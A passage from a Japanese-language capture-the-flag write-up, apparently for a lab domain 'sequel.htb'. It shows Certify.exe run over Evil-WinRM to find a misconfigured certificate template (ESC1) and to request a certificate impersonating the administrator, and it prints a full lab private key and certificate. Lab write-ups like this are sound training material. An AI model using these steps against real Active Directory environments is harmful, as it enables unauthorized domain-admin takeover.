（Rubeus.exeとかCertify.exeは[Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)にある）

まずは脆弱なテンプレートがあるかをチェックする

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-5
 ```
 
 on behalf of administrator, certificateをリクエストする
 
 ```
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 19

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxClNG8+fUy9hGRgsD+8Pr44VnKfv/9AE0CWEJfWIBIH0S58v
rXvefGtJ1LyevewKWGGUznYpk3+Gt/Eub9N48KzE8n7yks0Rnaia4IK07lY6xus8
qUifwaq/zMfVNaM6JcMQmgppQA6hNiXn7FZMMmeL9cmKo5pvpp9sjvi1khyrxCBt
cUzZP7v+G4k5vGUzlLLQT7uJFptUDtjBU85P2VgTrTY0Zn8PL05z85dB92CSX1bq
AYnLdBFbDpkh/oZJGp4rze7B2YLgBZoIai8Fy04aQEN9oIatKBpd7lbMZ8vKlL46
5+4w52I9BeaG4HhYn/H+4mYKhNFqe6bascaPpQIDAQABAoIBACzX3D7NWfjkTeg0
tG34ErfpXVtwsNbkMRV8XhdnZ+7P3o8jFv0r4hLDXB979zYnrb3CoQgJzzte3edT
BXCfAXjTpjphdwbERpCqKK3Gc6JAqDMtN7LjXVIivLINxNn8NKDJVRRB6QmxznzY
cYp/t++V6FMJ/d2kwn1u2JxekvORn+PvM0GnWqnzjFALJEHP5gDoPrY4pNEnzJAg
0BIn2Lr2WiGdPgsj9Y8Ob1qf6xgtyw3mleoBl3yUVQARJ1VBLWeACFy5fPM5J6DQ
Yr1AMp1+83lVwwVN1va0soyblNBH7J1od81T10foRAIP6oFpur28+0p5bnbsoJrs
1wvyA0kCgYEA4n+vDimlbgqVUbGow499B1g/JxIf7fuLEDW96PqOMbSNnqQxQekR
bVF+c7zyXlaAXqL5bd7F3oy+nAllXf7ZnMtUANfL53stttO1gPe5og30BzTEMJcH
89OLhEi6WQft+VHrh7KcVelvNDMYA1iUZU9YRaBQYnU8mTkKMEmfRMsCgYEA3bYN
zU6DOQRy8jRefdBtsfJSyrk6ObZXWjvG4Bb0Ig9YVJH3dEcOjB09fQjCqOpNIPq0
kHWcxTCqGlyMmFEjLa6lUCoVbZRTikjkTCksOYFiH3q/cKmnzAOsUjnSsfv2Vtwl
Et2ibZquPjK8QUc6guyt7/JGcP/6qj2hytMrX08CgYAyY52aVQGMvaYCire06hMy
sxs5ofqggzmo3YvmbPd9b2GiTXz34NYTr/Gl5f81paDhbPh4zPrQTBeLtztp8eyP
yVxi459lXC4LYoYarwIJX3lOsRqEhNUsFYAQae2rKOx0bxkrEz1cj5ZB0qwg8m/x
KfnFY6j+fn6AyAPQQlDAiQKBgF4QaGirn9boAVCrUU+1x2SQ9/lUftSPfR4mcGkQ
tAFjW0l+KGun3g8qNLVAqz35MkIEu+jyTVIIJJNMosXY3sD58N9DC5ZTMOJhrKJ3
cXDwaM4MSP6mrC9Ne6XjLHYg/VG60uvfJpOz5asz4VUcwEFd4yoDM0msARCLV4Jy
91rXAoGAP/CJah1au83z3o34SMn4LVGHwmqoQHavQSTBi2OVQrdfJ5YzYqHYezFq
6dNadQt97KCiaig3UYRINfvOUKc9Z8auqMqzamufu4n5fw7WlFOd87baH5Qdr3YF
xfFq5DkFLBEyKMxmm07f0SOKVdYzu+ZP22eJZ35Vll6h3dY6nSU=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAABMCZtW+GpDlmwAAAAAAEzANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMzA5MTkxMDQ2WhcNMjUwMzA5
MTkyMDQ2WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDEKU0bz59TL2EZGCwP7w+vjhWc
p+//0ATQJYQl9YgEgfRLny+te958a0nUvJ697ApYYZTOdimTf4a38S5v03jwrMTy
fvKSzRGdqJrggrTuVjrG6zypSJ/Bqr/Mx9U1ozolwxCaCmlADqE2JefsVkwyZ4v1
yYqjmm+mn2yO+LWSHKvEIG1xTNk/u/4biTm8ZTOUstBPu4kWm1QO2MFTzk/ZWBOt
NjRmfw8vTnPzl0H3YJJfVuoBict0EVsOmSH+hkkanivN7sHZguAFmghqLwXLThpA
Q32ghq0oGl3uVsxny8qUvjrn7jDnYj0F5obgeFif8f7iZgqE0Wp7ptqxxo+lAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIFjBZ0VUF4lSYWdY6xEnX0qGCiX
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAdz4H86jBy0OP25GULj9rgUBPio7JRi4bEa0sVT8VKIm7ZhvByTrCX4Ep
wIlG+FmaVrjV+mQWd1qMY95gt/dtH4BGTG02LH+8SXr8HQryn+LpiKBKXjCebZPU
VQDdhGxPuBxQw9McKIJwh2WyD4vdRi7bERlF6stSUZwGrI+dn9XkLwrXRIfmG58Z
r9eZCOmvGaMDqBSRRP3wYsMfUCsituyqTqIbCBQ+ESNtApYbcb1+ANZc/Qd+Xq6W
xRtGYKgrUmsctglMl5vTiEE2DY7o2JTAwr5WGMTY/QbRq8r3R2XksaDraW7zdcxb
4K9TRww037PTGXpArfhi5ibQrUSqxA==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
 
 
 参考：
 - [From Misconfigured Certificate Template to Domain Admin(Read Team Notes)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
 - [Misconfigured Certificate Templates - ESC1 (Hack Tricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)
